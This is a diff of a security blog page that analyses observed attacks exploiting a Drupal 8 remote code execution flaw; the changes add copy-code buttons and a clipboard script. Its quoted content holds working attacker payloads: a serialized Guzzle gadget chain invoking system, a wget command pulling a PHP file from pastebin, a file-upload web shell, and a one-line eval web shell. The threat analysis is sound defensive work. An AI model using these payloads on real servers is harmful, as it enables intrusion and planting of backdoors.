@@ -18,8 +18,30 @@
 <p>Figure 1: Hits on rule D0020, with the first attack seen on the 22th February 2019.</p>
 <p>These first attacks leveraged the “guzzle/rce1” gadget from phpggc to invoke the linux command “id” via PHP’s “system” function, exactly as <a href="https://www.ambionics.io/blog/drupal8-rce" target="_blank" rel="noopener noreferrer">ambionics</a> did.</p>
 <div class="emdash-code">
-	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">'O:24:"GuzzleHttp\Psr7\FnStream":2:{s:33:"GuzzleHttp\Psr7\FnStreammethods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\HandlerStack":3:{s:32:"GuzzleHttp\HandlerStackhandler";s:2:"id";s:30:"GuzzleHttp\HandlerStackstack";a:1:{i:0;a:1:{i:0;s:6:"system";}}s:31:"GuzzleHttp\HandlerStackcached";b:0;}i:1;s:7:"resolve";}}s:9:"_fn_close";a:2:{i:0;r:4;i:1;s:7:"resolve";}}''</span></span></code></pre>
+	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">'O:24:"GuzzleHttp\Psr7\FnStream":2:{s:33:"GuzzleHttp\Psr7\FnStreammethods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\HandlerStack":3:{s:32:"GuzzleHttp\HandlerStackhandler";s:2:"id";s:30:"GuzzleHttp\HandlerStackstack";a:1:{i:0;a:1:{i:0;s:6:"system";}}s:31:"GuzzleHttp\HandlerStackcached";b:0;}i:1;s:7:"resolve";}}s:9:"_fn_close";a:2:{i:0;r:4;i:1;s:7:"resolve";}}''</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
+<script type="module">
+	globalThis.process ??= {}, globalThis.process.env ??= {}, document.querySelectorAll(`[data-code-copy]`).forEach(e => {
+		let t = e.closest(`.emdash-code`)?.querySelector(`pre code`);
+		if (!t) return;
+		let n = e.dataset.copyLabel ?? ``,
+			r = e.dataset.copiedLabel ?? ``,
+			i = null;
+		e.addEventListener(`click`, () => {
+			navigator.clipboard.writeText(t.textContent ?? ``).then(() => {
+				e.setAttribute(`data-copied`, ``), e.setAttribute(`aria-label`, r), i && clearTimeout(i), i = setTimeout(() => {
+					e.removeAttribute(`data-copied`), e.setAttribute(`aria-label`, n), i = null
+				}, 1500)
+			}).catch(e => {
+				console.warn(`code-copy: clipboard write failed`, e)
+			})
+		})
+	});
+</script>
 <p>After this we saw several more attempts to use this gadget for executing various payloads, mostly to test whether targeted servers were vulnerable. Things like ‘phpinfo’, echoing strings and performing calculations.</p>
 <p>The first malicious payload we saw used the same gadget, but this time to save a malicious payload from pastebin onto the user’s server.</p>
 <p><code>wget -O 1x.php https://pastebin.com/raw/npLq4493</code></p>
@@ -32,7 +54,11 @@
 <span class="line"><span class="sk-6f42c1-ffc799">    Echo</span><span class="sk-032f62-99ffe4"> "&lt;script&gt;alert('upload Done');</span></span>
 <span class="line"><span class="sk-032f62-99ffe4">		&lt;/script&gt;&lt;b&gt;Uploaded !!!&lt;/b&gt;&lt;br&gt;name : ".</span><span class="sk-24292e-fff">$_FILES</span><span class="sk-032f62-99ffe4">['uploads']['name']."&lt;br&gt;size : ".</span><span class="sk-24292e-fff">$_FILES</span><span class="sk-032f62-99ffe4">['uploads']['size']."&lt;br&gt;type : ".</span><span class="sk-24292e-fff">$_FILES</span><span class="sk-032f62-99ffe4">['uploads']['type']</span><span class="sk-24292e-fff">;</span></span>
 <span class="line"><span class="sk-24292e-fff">}</span></span>
-<span class="line"><span class="sk-d73a49-a0a0a0">?&gt;</span></span></code></pre>
+<span class="line"><span class="sk-d73a49-a0a0a0">?&gt;</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>Another malicious payload seen was much more minimal:</p>
 <p><code>echo '&lt;?php @eval($_POST['pass']) ?&gt;' &gt; vuln1.php</code></p>
